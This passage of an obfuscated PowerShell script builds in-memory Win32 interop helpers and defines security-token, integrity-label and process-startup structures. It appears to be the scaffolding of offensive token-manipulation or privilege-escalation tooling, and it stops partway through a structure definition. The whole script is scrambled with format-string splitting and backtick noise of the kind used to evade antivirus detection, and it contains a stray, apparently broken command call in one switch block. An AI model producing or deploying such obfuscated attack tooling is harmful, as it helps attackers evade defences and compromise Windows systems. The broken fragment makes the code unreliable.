 seT-ITeM  ('V'+'ARiAB'+'le'+':rO4kd')  (  [tYpE]("{0}{1}" -F 'gu','ID')  );    sEt-ItEm  ("{4}{1}{2}{3}{0}" -f'5','aRiABle:B','6','mjk','v') ( [TyPe]("{2}{4}{3}{5}{1}{0}{6}"-f '.AS','oN','R','t','EFleC','i','SEMbLy')) ;   $dGIZ  =[TYPe]("{4}{5}{0}{1}{3}{6}{2}" -f'liNgC','OnvEN','oN','T','rUnTiMe.i','ntErOpsERviceS.cAL','i');    $WenVZJ  =  [TyPE]("{0}{3}{1}{2}{6}{7}{5}{4}"-F'rUnTImE','INTeR','OpsE','.','.charseT','ES','R','vic') ;  SET-itEm  ("{1}{3}{0}{2}{4}"-f'C7','VARIAblE:1','3','w','4')  ([TYpE]("{3}{1}{2}{4}{7}{5}{6}{0}" -f'E','T','IME.I','ruN','nt','RoPSeRvIces.dllI','mporTAtTRibUt','e')  );   $4Z8l  = [TYPe]("{3}{0}{1}{2}"-f'lAGsaTTR','ibut','E','F')  ;  set-itEM ("{1}{3}{0}{2}" -f':0G32','vAriab','SV','LE')  ( [TYpE]("{4}{7}{6}{2}{5}{0}{3}{1}" -f'It','ngsize','ON','.pacKi','REfLEc','.eM','I','T')  ) ;$0Q8v =[typE]("{3}{0}{6}{5}{2}{1}{4}{7}"-F 'timE.i','R','hA','SYSTeM.run','s','erVICeS.c','nteROps','et') ;  set-itEm  ("{1}{4}{0}{3}{2}"-f'mF','v','nX','q7','ARiaBlE:')  ( [TyPE]("{1}{6}{4}{0}{5}{2}{3}" -F'n','re','YPE','attRiButEs','ctIO','.T','flE'));   $Dwnbj = [TYpe]("{6}{5}{4}{3}{0}{1}{2}"-F 'OpSErVicES.MaRSHa','L','aSatTrIBute','eR','ME.INT','tI','RuN') ;SET-IteM  ("{4}{0}{2}{1}{3}"-f'L',':75','E','op','VariaB')  ( [typE]("{1}{0}"-f'Ype','T')  ) ; $y0en6  =[tYpE]("{0}{1}{2}{5}{3}{6}{4}"-f'ReflECT','IoN.','e','Op','oDeS','Mit.','c') ;   $C8sRz =[TYpe]("{1}{0}" -F'inT32','u');    $SX39c =  [typE]("{0}{2}{1}"-f 'IN','PTR','T') ;    sV ('3M6'+'e')  ([tYPe]("{3}{0}{2}{1}" -F'e','tPtR','m.in','sYsT') )  ; set ("1lA5"+"Te") ( [TYpe]("{1}{0}{2}"-F 'iV','ACt','aTor')  )  ; Sv  ("{0}{1}"-f '69','SmO')  ( [tYpE]("{0}{7}{5}{9}{10}{8}{1}{4}{2}{3}{6}"-F 'system.RuNT','PsE','s','.Ma','RviCe','e.I','RshAL','im','o','NT','eR') );    $HET =[tyPe]("{6}{9}{1}{2}{3}{4}{8}{0}{7}{5}"-f 's.MA','t','eR','OPsE','R','Al','RUNtim','rSH','VICe','e.In') ;function NEw`-in`MemOR`yM`ODUle
{


    Param
    (
        [Parameter(pOSItiON = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Mo`D`U`LeNaMe} =  $Ro4kD::("{0}{1}"-f'N','ewGuid').Invoke().("{0}{2}{1}"-f'ToStr','g','in').Invoke()
    )

    ${a`p`pD`omAIn} =   $b6MjK5."aSsem`B`Ly".("{0}{1}{2}"-f 'Get','Ty','pe').Invoke(("{4}{1}{3}{0}{2}"-f'ai','Ap','n','pDom','System.')).("{3}{0}{2}{1}" -f 'etP','operty','r','G').Invoke(("{0}{1}{2}"-f 'CurrentD','omai','n')).("{1}{2}{0}" -f 'alue','Ge','tV').Invoke(${N`ULL}, @())
    ${Lo`AdeD`ASSem`BLieS} = ${A`P`pdOmA`iN}.("{1}{3}{0}{2}"-f 'ssem','G','blies','etA').Invoke()

    foreach (${asSem`Bly} in ${lo`Ad`e`DasSemblIES}) {
        if (${As`SeMB`Ly}."fU`LlNa`Me" -and (${A`Sse`mblY}."f`UlLna`mE".("{0}{1}" -f'Spl','it').Invoke(',')[0] -eq ${M`oDUle`N`Ame})) {
            return ${aSSEm`B`Ly}
        }
    }

    ${DY`NA`sSem`BLY} = &("{1}{2}{0}"-f 'Object','Ne','w-') ("{1}{3}{0}{2}{4}"-f'em','Refle','b','ction.Ass','lyName')(${m`ODuL`ENA`ME})
    ${dOM`AIN} = ${A`PpdO`mAin}
    ${AS`sE`MB`lybUilDEr} = ${Do`mAIN}.("{2}{0}{4}{1}{3}" -f'efineDynam','embl','D','y','icAss').Invoke(${dY`NAS`SEMB`ly}, 'Run')
    ${MO`Du`LEb`U`ildeR} = ${A`Sse`mblY`BuiL`dEr}.("{0}{3}{2}{1}"-f'D','icModule','neDynam','efi').Invoke(${mO`dulE`NaME}, ${f`AL`Se})

    return ${m`o`dUleb`UIldEr}
}

function FU`Nc
{
    Param
    (
        [Parameter(PoSitiOn = 0, maNdatOry = ${tr`Ue})]
        [String]
        ${dLl`N`AME},

        [Parameter(pOSiTioN = 1, MANDAtory = ${Tr`UE})]
        [string]
        ${Fu`NCTIOnNA`ME},

        [Parameter(POsiTiOn = 2, mANdatOrY = ${T`Rue})]
        [Type]
        ${R`E`TUrNTYPE},

        [Parameter(positIoN = 3)]
        [Type[]]
        ${Par`Am`ET`erTy`PEs},

        [Parameter(pOSItiOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${N`At`I`V`eCAlLiNgcONvENTI`on},

        [Parameter(PositIoN = 5)]
        [Runtime.InteropServices.CharSet]
        ${C`Harset},

        [String]
        ${eNTry`Po`INT},

        [Switch]
        ${SeTl`A`sTeR`Ror}
    )

    ${p`RO`PeR`TiEs} = @{
        ("{0}{1}"-f'DllNa','me') = ${D`l`LnamE}
        ("{1}{2}{0}"-f'nName','Functi','o') = ${f`U`NcTIo`Nna`Me}
        ("{2}{3}{0}{1}" -f'u','rnType','Re','t') = ${re`TurN`TypE}
    }

    if (${pA`R`Ame`TeRtypes}) { ${PRo`perT`I`eS}[("{1}{0}{3}{2}"-f'am','Par','pes','eterTy')] = ${ParA`MEter`TYPes} }
    if (${naT`IV`ECAlLiNG`COnVentI`On}) { ${Pr`O`PeRT`ies}[("{2}{1}{3}{0}{4}" -f 'n','eCallin','Nativ','gConve','tion')] = ${Nati`VE`CaL`li`NgC`OnVeN`TiON} }
    if (${cha`R`seT}) { ${P`RoP`eRTI`Es}[("{1}{2}{0}"-f'rset','Ch','a')] = ${CH`A`Rset} }
    if (${Set`lAsTE`R`R`OR}) { ${pr`OPer`TieS}[("{0}{2}{3}{1}" -f 'S','or','etLa','stErr')] = ${Se`TLaSTerr`oR} }
    if (${EN`TRY`p`oiNT}) { ${PrO`PErTi`eS}[("{0}{2}{1}" -f'E','nt','ntryPoi')] = ${e`NTRy`poinT} }

    &("{1}{2}{0}" -f 'ect','New-Ob','j') ("{0}{1}"-f'PSObj','ect') -Property ${pR`oP`eRt`iEs}
}

function ADD`-W`I`N32TypE
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(MaNdaTOry = ${t`RUE}, vAlUeFrOmPipELInEbyPROpErTYnamE = ${TR`UE})]
        [String]
        ${DLl`N`AMe},

        [Parameter(MandaTOrY = ${tR`UE}, ValUefRomPIPELinEBypRopeRtYnAmE = ${T`Rue})]
        [String]
        ${f`UnC`Tio`NnaMe},

        [Parameter(MAnDATory = ${Tr`UE}, valUefRompipeLInebYProPerTYNAmE = ${t`Rue})]
        [Type]
        ${ret`URn`TypE},

        [Parameter(VaLuEFrompIPelineByprOpERTYNAMe = ${tr`Ue})]
        [Type[]]
        ${P`A`RAMET`er`TYpEs},

        [Parameter(vaLueFromPIPeLiNeBYPRoperTyNaME = ${t`RUE})]
        [Runtime.InteropServices.CallingConvention]
        ${NatIv`ecALL`IngcoNvE`Nt`Ion} =  $DgiZ::"S`TDcalL",

        [Parameter(VALuefromPIpelInEbyPRoPerTYNAmE = ${t`RuE})]
        [Runtime.InteropServices.CharSet]
        ${c`hA`RsET} =   (  VarIABlE ("w"+"envZ"+"J") -val)::"Au`To",

        [Parameter(VaLuEFROMPIpElinebyPROpERTYnAmE = ${t`RUE})]
        [Switch]
        ${S`eT`LasTeRROr},

        [Parameter(MAnDAtOry = ${tR`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${m`oD`UlE},

        [ValidateNotNull()]
        [String]
        ${N`A`mESPAce} = ''
    )

    BEGIN
    {
        ${tYpe`h`ASh} = @{}
    }

    PROCESS
    {
        if (${mo`DU`Le} -is [Reflection.Assembly])
        {
            if (${NAME`SP`A`ce})
            {
                ${tYP`E`hAsh}[${d`lL`Name}] = ${m`ODuLe}.("{1}{0}"-f'pe','GetTy').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${T`YPe`hA`SH}[${dL`LN`AmE}] = ${moD`U`LE}.("{0}{1}{2}" -f'G','etTy','pe').Invoke(${dllN`A`ME})
            }
        }
        else
        {
            
            if (!${t`ypEHASh}.("{0}{2}{3}{1}"-f 'Co','Key','nt','ains').Invoke(${D`llN`Ame}))
            {
                if (${nA`mE`SPAce})
                {
                    ${TY`p`eH`ASH}[${d`LLN`AmE}] = ${MOd`UlE}.("{2}{0}{1}" -f 'n','eType','Defi').Invoke("$Namespace.$DllName", ("{2}{4}{0}{3}{5}{1}" -f'or','it','Public,B','eF','ef','ieldIn'))
                }
                else
                {
                    ${TYPEh`ASh}[${d`L`LnAME}] = ${M`oDuLE}.("{0}{2}{1}"-f'De','Type','fine').Invoke(${D`llNa`ME}, ("{1}{2}{3}{0}" -f 'ldInit','P','ubl','ic,BeforeFie'))
                }
            }

            ${m`eTH`Od} = ${tYP`eH`Ash}[${dllN`A`ME}].("{1}{2}{0}"-f 'thod','Defi','neMe').Invoke(
                ${f`Un`ct`ionNamE},
                ("{5}{4}{1}{0}{2}{6}{3}" -f 'ati','c,St','c,','mpl','bli','Pu','PinvokeI'),
                ${r`EtUrnt`Y`pE},
                ${P`ARaMeTertY`p`Es})

            
            ${I} = 1
            ForEach(${p`Aram`EteR} in ${p`Ar`A`mEtertY`PeS})
            {
                if (${p`A`RaMeteR}."isBYR`eF")
                {
                    [void] ${MEtH`OD}.("{0}{3}{2}{1}"-f'De','er','Paramet','fine').Invoke(${i}, 'Out', ${nu`LL})
                }

                ${I}++
            }

            ${d`LLImp`ORt} = [Runtime.InteropServices.DllImportAttribute]
            ${SetlAST`ER`R`o`RfIeld} = ${DLlIM`PO`RT}.("{1}{2}{0}" -f 'd','Ge','tFiel').Invoke(("{0}{2}{1}" -f 'SetLa','tError','s'))
            ${ca`LL`INgc`onveNT`IOnFiELD} = ${d`LLImP`ORt}.("{0}{2}{1}" -f 'GetFi','ld','e').Invoke(("{3}{0}{2}{1}" -f 'all','Convention','ing','C'))
            ${CHArseT`F`i`ELd} = ${D`LlImPo`Rt}.("{2}{0}{1}"-f'Fi','eld','Get').Invoke(("{2}{0}{1}" -f'harS','et','C'))
            if (${SE`TL`AS`TeRRoR}) { ${s`LE`VALuE} = ${Tr`Ue} } else { ${SlE`V`Alue} = ${faL`SE} }

            
            ${C`Ons`Tru`CToR} =   ( GET-vARiablE  ("{0}{2}{1}"-f'1','4','wc73')  -Va  )."getCOns`T`R`UctOr"([String])
            ${dL`LI`mport`At`TRiBu`TE} = &("{1}{0}{3}{2}"-f 'w','Ne','t','-Objec') ("{1}{4}{3}{2}{0}{5}{6}" -f'Attrib','Refle','.Emit.Custom','n','ctio','uteBuil','der')(${CoNS`TrU`C`ToR},
                ${d`LlnA`me}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${seTl`ASterrO`RfIE`LD}, ${caLl`iN`gC`o`NveNtI`O`N`FIEld}, ${CH`A`Rs`etF`IELd}),
                [Object[]] @(${slev`AL`UE}, ([Runtime.InteropServices.CallingConvention] ${NatIVecaLlI`N`G`C`onv`eNT`ion}), ([Runtime.InteropServices.CharSet] ${c`HA`RSeT})))

            ${mEt`HoD}.("{0}{1}{2}{3}"-f'S','etCustomAt','tri','bute').Invoke(${Dl`L`ImPort`A`TTrIbutE})
        }
    }

    END
    {
        if (${moD`Ule} -is [Reflection.Assembly])
        {
            return ${T`Yp`ehASh}
        }

        ${r`eTUR`NT`yPEs} = @{}

        ForEach (${K`ey} in ${tYP`E`hASh}."K`EYS")
        {
            ${Ty`Pe} = ${T`ype`h`ASH}[${K`ey}].("{1}{0}{2}" -f'a','Cre','teType').Invoke()

            ${r`et`Ur`NTypES}[${k`ey}] = ${TY`pe}
        }

        return ${Ret`U`Rn`TyPEs}
    }
}

function p`sE`Num
{


    [OutputType([Type])]
    Param
    (
        [Parameter(PositioN = 0, MANDATOry = ${tR`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mODU`LE},

        [Parameter(poSItION = 1, MAndAtOrY = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FUlln`A`mE},

        [Parameter(POsITIon = 2, MaNDaTORY = ${T`RuE})]
        [Type]
        ${T`YPe},

        [Parameter(PoSItiON = 3, MaNDAtorY = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${eN`UMeLe`M`En`Ts},

        [Switch]
        ${biT`FIeLd}
    )

    if (${m`oDU`Le} -is [Reflection.Assembly])
    {
        return (${m`odu`LE}.("{1}{0}" -f 'e','GetTyp').Invoke(${fU`Llna`me}))
    }

    ${eNumt`Y`pE} = ${tY`Pe} -as [Type]

    ${en`UMB`UIlDEr} = ${Mo`dULe}.("{0}{1}{2}{3}" -f 'Def','i','neE','num').Invoke(${fuLl`N`Ame}, ("{1}{0}" -f'ublic','P'), ${e`NuMtY`PE})

    if (${b`i`TFiELD})
    {
        ${fLaG`SC`ONStR`UCToR} =   $4z8L."G`Etc`OnS`TRu`CToR"(@())
        ${fLAg`Sc`USTOmaT`TRI`Bute} = &("{3}{1}{2}{0}"-f 'ct','w-Ob','je','Ne') ("{9}{2}{8}{4}{0}{7}{3}{5}{6}{10}{1}" -f's','r','c','Att','on.Emit.Cu','ri','buteB','tom','ti','Refle','uilde')(${flagSc`On`S`TR`U`ctoR}, @())
        ${eN`UmBUilD`er}.("{2}{5}{4}{0}{3}{1}"-f 'ib','e','SetCu','ut','omAttr','st').Invoke(${FlAG`SCUS`TomaTT`R`i`BU`TE})
    }

    ForEach (${K`Ey} in ${En`Ume`lEMENTs}."K`eYS")
    {
        
        ${N`UlL} = ${eNum`B`UiLD`Er}."DEfINeLi`TE`R`AL"(${K`eY}, ${E`NUmeLE`mEnts}[${K`EY}] -as ${E`NuMt`ypE})
    }

    ${E`N`UMBuild`eR}.("{0}{2}{1}"-f 'Cr','pe','eateTy').Invoke()
}

function F`ield
{
    Param
    (
        [Parameter(POSiTion = 0, manDatOry = ${T`RUE})]
        [UInt16]
        ${p`osiTiON},
        
        [Parameter(POSitiOn = 1, ManDATORy = ${T`RUE})]
        [Type]
        ${T`YpE},
        
        [Parameter(PoSITiON = 2)]
        [UInt16]
        ${oF`F`SEt},
        
        [Object[]]
        ${Ma`RSh`ALAS}
    )

    @{
        POsiTIon = ${pO`s`ItiOn}
        ("{0}{1}" -f 'Ty','pe') = ${T`Ype} -as [Type]
        ("{1}{0}" -f'fset','Of') = ${of`FsET}
        ("{2}{1}{0}" -f's','shalA','Mar') = ${maR`SH`AL`AS}
    }
}

function sT`RuCT
{


    [OutputType([Type])]
    Param
    (
        [Parameter(poSItIon = 1, manDATorY = ${t`RuE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mOD`U`lE},

        [Parameter(pOsitiOn = 2, manDATory = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`Ull`NAme},

        [Parameter(poSition = 3, MAnDatORY = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${s`T`RUc`TfiELDs},

        [Reflection.Emit.PackingSize]
        ${pAcKiN`g`sizE} =   $0G32sV::"U`NsPeC`i`FiED",

        [Switch]
        ${ex`P`liCIt`l`AYOUT},

        [System.Runtime.InteropServices.CharSet]
        ${c`H`ARseT} =  (  gET-vaRIABle  ("{1}{0}"-f'q8V','0'))."VA`Lue"::"A`NSI"
    )

    if (${MoDU`lE} -is [Reflection.Assembly])
    {
        return (${m`oDuLE}.("{0}{1}" -f 'GetTy','pe').Invoke(${F`U`L`LnAME}))
    }

    [Reflection.TypeAttributes] ${StRu`ctATt`Ri`ButEs} = ("{12}{4}{8}{10}{3}{9}{11}{7}{2}{0}{6}{5}{1}"-f'ealed,
 ','   BeforeFieldInit','  S','c,
','    ',' ','   ',' ',' ','    ',' Publi',' ','Class,
  ')

    if (${Expl`IcItL`Ay`O`UT})
    {
        ${s`TrUcta`T`Tribut`eS} = ${STr`Uctatt`R`iB`U`TES} -bor  ( GET-varIABLE ("m"+"Fq7N"+"x") -ValuE )::"expl`iciTLAY`OUT"
    }
    else
    {
        ${StR`Uc`TA`TT`RiBUT`Es} = ${StrU`ct`A`T`TRIBuTes} -bor   (vARIAble  ('mFq7n'+'X') -VALuEO)::"SeQu`EnTIA`LLA`YOut"
    }

    switch(${C`haR`Set})
    {
        ("{0}{1}"-f 'A','nsi')
        {
            ${ST`RUctatTri`B`UT`eS} = ${STR`U`CTa`T`T`RibUTeS} -bor  (get-ITeM ("{0}{3}{2}{4}{1}"-f'VaRi','x','le:mfq','Ab','7n') )."vAl`Ue"::"A`NsiCL`ASs"
        }
        ("{1}{0}" -f'uto','A')
        {
            ${STr`Uc`T`AttRIB`U`TEs} = ${S`TR`UCT`ATt`RiBuTES} -bor   $MfQ7nX::"AUToc`lA`SS"
        }
        ("{1}{2}{0}" -f'ode','Uni','c')
        {
            ${s`T`R`Uct`ATtRIb`UteS} = ${sTrU`cTAttrI`BUt`es} -bor   $mFq7NX::"UnI`CoDEC`lA`ss"
        &('s')}
    }

    ${S`Tru`ctB`UIld`eR} = ${Mo`du`Le}."de`F`iNet`Ype"(${f`U`lLnaME}, ${STRuc`T`AtTRIB`UteS}, [ValueType], ${pa`CKInG`SIzE})
    ${c`oNStru`ct`O`RinfO} =  ( GeT-vaRIaBLe ('dWnB'+'J')  -VA).("{0}{1}{2}"-f'G','etConstru','ctors').Invoke()[0]
    ${SizE`C`ONst} = @(  (  LS  ("V"+"ARiA"+"bL"+"e:DWNBJ"))."VA`lUE".("{2}{0}{1}"-f'tF','ield','Ge').Invoke(("{0}{1}{2}"-f'Si','zeCons','t')))

    ${fIe`l`DS} = &("{0}{2}{1}"-f 'New','ect','-Obj') ("{2}{1}{0}"-f 'e[]','ashtabl','H')(${St`R`UCtfI`ELds}."COu`NT")

    
    
    
    foreach (${f`ielD} in ${S`TrUcTFiE`lds}."ke`ys")
    {
        ${I`NdEX} = ${sT`RUC`TfIE`lDS}[${fi`e`LD}][("{2}{0}{1}"-f 't','ion','Posi')]
        ${FI`ElDs}[${i`NdEx}] = @{("{1}{2}{0}"-f 'Name','Fi','eld') = ${f`IELd}; ("{1}{0}{2}" -f'ro','P','perties') = ${sT`RU`CT`Fie`lds}[${f`ieLd}]}
    }

    foreach (${FI`E`LD} in ${F`iE`lDs})
    {
        ${F`iELd`NAmE} = ${fi`Eld}[("{1}{2}{0}"-f'e','Fie','ldNam')]
        ${fi`el`DPR`op} = ${F`Ie`ld}[("{0}{2}{1}" -f 'Pro','erties','p')]

        ${OF`F`Set} = ${FI`eLDpr`oP}[("{0}{1}" -f 'Offse','t')]
        ${T`YPe} = ${fiel`dp`RoP}[("{1}{0}" -f 'e','Typ')]
        ${mA`Rs`hAlAs} = ${FI`el`dPROP}[("{0}{2}{3}{1}"-f'Mar','alAs','s','h')]

        ${NEw`FI`eld} = ${s`TRuC`TBu`ildEr}.("{2}{1}{0}"-f'eld','fineFi','De').Invoke(${f`i`eldnAmE}, ${T`ype}, ("{0}{1}" -f'Pu','blic'))

        if (${M`A`RShAlAs})
        {
            ${unManag`ED`Type} = ${mAR`sh`Alas}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${M`ARS`haLAS}[1])
            {
                ${S`IZE} = ${MARS`hAl`AS}[1]
                ${A`T`Tr`iBbuIldEr} = &("{3}{0}{1}{2}" -f '-Ob','j','ect','New') ("{5}{1}{2}{4}{3}{0}{6}"-f'uteB','eflect','ion.Emit','ustomAttrib','.C','R','uilder')(${conS`Tr`UcT`OrI`NFo},
                    ${UNM`ANa`GE`dTYpe}, ${siZe`Co`N`St}, @(${s`Ize}))
            }
            else
            {
                ${a`Ttr`iBB`UIlDER} = &("{0}{1}{2}" -f'N','ew-Ob','ject') ("{2}{4}{7}{1}{5}{6}{0}{3}" -f 'Bu','stom','R','ilder','eflecti','Attribut','e','on.Emit.Cu')(${C`onsT`RuCTO`R`iNFO}, [Object[]] @(${UnMan`AGeD`T`YpE}))
            }
            
            ${nEw`FI`eld}.("{0}{2}{3}{1}"-f 'SetCustomAt','bute','t','ri').Invoke(${A`T`TRIBB`U`iLder})
        }

        if (${e`XPl`iCitL`AY`oUt}) { ${NE`W`Fie`Ld}.("{2}{0}{1}" -f'f','fset','SetO').Invoke(${O`Ff`set}) }
    }

    
    
    ${s`Iz`EMEtHod} = ${ST`R`UctBu`iLD`Er}.("{2}{1}{0}"-f'thod','fineMe','De').Invoke(("{0}{1}{2}" -f'Get','Si','ze'),
        ("{2}{1}{0}" -f'ic, Static','l','Pub'),
        [Int],
        [Type[]] @())
    ${Il`gEnErA`TOR} = ${S`izEmETh`od}.("{2}{0}{3}{1}"-f'etI','tor','G','LGenera').Invoke()
    
    ${iLGE`Ner`A`Tor}.("{1}{0}" -f't','Emi').Invoke(  (GeT-VArIAbLE ("{0}{1}" -f'y','0EN6') )."Val`UE"::"l`dtoKEn", ${S`TrucT`BuI`ld`er})
    ${IlgE`Ner`At`OR}.("{1}{0}"-f 'mit','E').Invoke( $y0EN6::"c`ALL",
         (get-VariAblE  ("75O"+"P") )."V`ALuE".("{2}{1}{0}" -f'od','eth','GetM').Invoke(("{0}{2}{1}{3}"-f 'Ge','l','tTypeFromHand','e')))
    ${Ilg`En`er`ATOR}.("{0}{1}"-f 'Emi','t').Invoke( ( geT-varIaBle  ("{1}{0}" -f'0EN6','y')  )."VAL`Ue"::"ca`ll",
          ( chilDIteM  ("V"+"aRIabLe"+":"+"het")  )."vA`LUE".("{0}{2}{1}"-f'Get','ethod','M').Invoke(("{1}{0}"-f'izeOf','S'), [Type[]] @([Type])))
    ${iLgen`e`RAT`or}.("{0}{1}"-f 'Em','it').Invoke(  ( get-vaRIablE ("{0}{1}" -f 'y','0eN6')  -valUEONLy )::"r`Et")

    
    
    ${I`mP`LicITco`N`VeRTEr} = ${St`RuCtb`Uil`deR}.("{1}{0}{2}{3}" -f 'eMet','Defin','h','od').Invoke(("{3}{2}{1}{0}"-f'licit','p','_Im','op'),
        ("{10}{8}{1}{14}{7}{13}{2}{9}{15}{3}{11}{4}{6}{5}{12}{0}"-f'Name',' ','c, Stati','Hide','Sig, ','ec','Sp','b','Scope,','c,','Private','By','ial','li','Pu',' '),
        ${St`Ruc`TbuiL`DER},
        [Type[]] @([IntPtr]))
    ${ilgEnE`R`AT`Or2} = ${i`m`pLIciTCoNVER`T`ER}.("{1}{0}{2}"-f'Genera','GetIL','tor').Invoke()
    ${ILG`enE`RatO`R2}.("{1}{0}" -f 't','Emi').Invoke(  (  GeT-CHILdItEM ("{4}{0}{1}{2}{3}"-f'r','ia','BLE:Y0eN','6','VA'))."VaL`UE"::"n`oP")
    ${I`l`G`EnERATOr2}.("{1}{0}" -f'mit','E').Invoke(  (  vARIabLE  ('Y0e'+'n6')  -Va)::"lda`Rg`_0")
    ${IlGEn`e`R`Ato`R2}.("{1}{0}" -f'mit','E').Invoke( (lS ("{1}{0}{3}{2}" -f 'ARiaBlE','V','6',':Y0En') )."V`ALUe"::"L`Dto`KeN", ${STRU`CTbUi`ldER})
    ${i`lGenerATo`R2}.("{1}{0}" -f 't','Emi').Invoke(  (  vAriaBLe ("{1}{0}"-f 'N6','Y0e') )."V`ALuE"::"cA`lL",
         (  CHILdItEM ("{0}{3}{2}{1}" -f 'VA','Ble:75Op','IA','R'))."v`ALUe".("{1}{0}"-f'ethod','GetM').Invoke(("{2}{3}{1}{4}{0}" -f'le','mHa','GetT','ypeFro','nd')))
    ${I`LgENeRATO`R2}.("{1}{0}"-f'it','Em').Invoke(  $y0en6::"CA`LL",
         (IteM  ("va"+"RIABLE:he"+"T")  )."val`UE".("{1}{0}{2}"-f 'Metho','Get','d').Invoke(("{0}{3}{1}{2}" -f 'Pt','ru','cture','rToSt'), [Type[]] @([IntPtr], [Type])))
    ${I`LgeneRA`TOr2}.("{1}{0}" -f 'it','Em').Invoke( ( vARiABlE ("{1}{0}" -f'6','Y0en') -Va)::"un`B`OX_Any", ${sTRU`CTB`UILDEr})
    ${i`Lge`N`eRaTOr2}.("{1}{0}" -f'it','Em').Invoke( (lS ("v"+"Ar"+"i"+"abLe:y0EN"+"6")  )."V`AluE"::"r`ET")

    ${s`TRUcTbuI`ldER}.("{0}{2}{1}" -f'Cr','e','eateTyp').Invoke()
}

${m`o`DulE} = &("{1}{3}{0}{2}"-f 'MemoryModu','New-I','le','n') -ModuleName ("{0}{1}" -f 'W','in32')

${SE`_gro`UP} = &("{0}{1}" -f 'psen','um') ${mo`dulE} ("{1}{0}{2}" -f'E_GR','S','OUP') ("{0}{1}"-f'UInt3','2') @{
    ("{1}{0}{2}" -f 'E','DISABL','D')           = 0x00000000
    MANdatORY          = 0x00000001
    ("{2}{1}{0}{5}{4}{3}"-f'B','A','EN','ULT','_DEFA','LED_BY') = 0x00000002
    ("{2}{1}{0}" -f 'ABLED','N','E')            = 0x00000004
    ("{1}{0}" -f 'R','OWNE')              = 0x00000008
    ("{3}{5}{4}{0}{1}{2}"-f'Y_','O','NLY','U','_DEN','SE_FOR')  = 0x00000010
    ("{0}{1}"-f'INT','EGRITY')          = 0x00000020
    ("{3}{0}{2}{1}{4}"-f'N','TY_EN','TEGRI','I','ABLED')  = 0x00000040
    ("{1}{0}" -f 'CE','RESOUR')           = 0x20000000
    ("{2}{0}{1}"-f'OGO','N_ID','L')           = 3221225472
} -Bitfield


${se`curI`Ty_AtT`R`ibU`T`eS} = &("{0}{1}" -f 'stru','ct') ${Mod`ULe} ("{3}{0}{5}{1}{2}{4}" -f 'UR','TY_','ATT','SEC','RIBUTES','I') @{
    ("{1}{2}{0}" -f 'h','nLeng','t') = &("{0}{1}"-f'fi','eld') 0 ("{0}{1}" -f 'I','nt')
    ("{1}{3}{2}{4}{0}"-f'tor','lpSe','rityDescr','cu','ip') = &("{0}{1}" -f 'f','ield') 1 ("{0}{1}" -f 'IntP','tr')
    ("{0}{2}{1}"-f 'bI','Handle','nherit') = &("{0}{1}" -f 'fie','ld') 2 ("{1}{0}" -f't','In')
}

${sID`_IdeNtifIE`R`_a`UT`ho`Rity} = &("{0}{1}"-f'st','ruct') ${mO`duLe} ("{2}{3}{4}{0}{1}"-f'ER_AUTH','ORITY','SID_IDE','NT','IFI') @{
    ("{1}{0}" -f 'lue','va') = &("{1}{0}"-f 'ld','fie') 0 ("{1}{0}"-f 'te[]','by') -MarshalAs @(("{2}{3}{1}{0}"-f 'y','a','ByValAr','r'),6)
}

${si`D_aND`_AttRib`U`TES} = &("{1}{0}" -f 'ct','stru') ${m`ODULE} ("{0}{2}{3}{1}" -f'SID_AND_ATT','S','RIBU','TE') @{
    ("{1}{0}"-f'd','Si') = &("{0}{1}"-f'fiel','d') 0 ("{0}{1}"-f 'IntPt','r')
    ("{2}{0}{1}"-f'ibu','tes','Attr') = &("{0}{1}"-f 'fiel','d') 1 ${s`E_`GROuP}
}


${T`o`ke`N_`M`An`dAtoRY_LabEl} = &("{1}{0}" -f'ct','stru') ${m`odUle} ("{0}{5}{4}{3}{2}{1}"-f'TO','_LABEL','RY','ANDATO','M','KEN_') @{
    ("{1}{0}"-f 'abel','L') = &("{0}{1}" -f'fie','ld') 0 ${siD_A`ND_`ATT`RI`BU`Tes}
}

${STA`RtUpi`N`Fo} = &("{1}{0}"-f 't','struc') ${MoDU`LE} ("{0}{2}{1}" -f'ST','NFO','ARTUPI') @{
    ('cb') = &("{1}{0}" -f'eld','fi') 0 ("{0}{1}"-f'i','nt')
    ("{1}{0}{2}"-f 'serve','lpRe','d') = &("{1}{0}"-f'ld','fie') 1 ("{0}{2}{1}" -f'st','g','rin')
    ("{2}{1}{0}"-f'sktop','De','lp') = &("{0}{1}" -f 'f','ield') 2 ("{0}{1}"-f 'strin','g')
    ("{1}{0}" -f'pTitle','l') = &("{1}{0}"-f'ield','f') 3 ("{1}{0}" -f 'g','strin')
    ("{1}{0}"-f'wX','d') = &("{0}{1}" -f'fi','eld') 4 ("{0}{1}"-f'i','nt')
    ("{0}{1}"-f'd','wY') = &("{1}{0}"-f 'd','fiel') 5 ("{0}{1}" -f'i','nt')
    ("{0}{1}"-f 'dw','XSize') = &("{1}{0}" -f'ld','fie') 6 ("{1}{0}"-f 'nt','i')
    ("{0}{2}{1}"-f 'dw','ize','YS') = &("{1}{0}" -f 'eld','fi') 7 ("{1}{0}" -f't','in')
    ("{0}{3}{4}{2}{1}" -f 'dwX','s','Char','Co','unt') = &("{1}{0}"-f'ld','fie') 8 ("{1}{0}" -f't','in')
    ("{1}{2}{0}"-f'Chars','dw','YCount') = &("{0}{1}" -f 'fie','ld') 9 ("{0}{1}"-f 'i','nt')
    ("{0}{4}{1}{2}{3}" -f'dwFill','t','tribu','te','A') = &("{0}{1}" -f'fi','eld') 10 ("{1}{0}"-f 't','in')
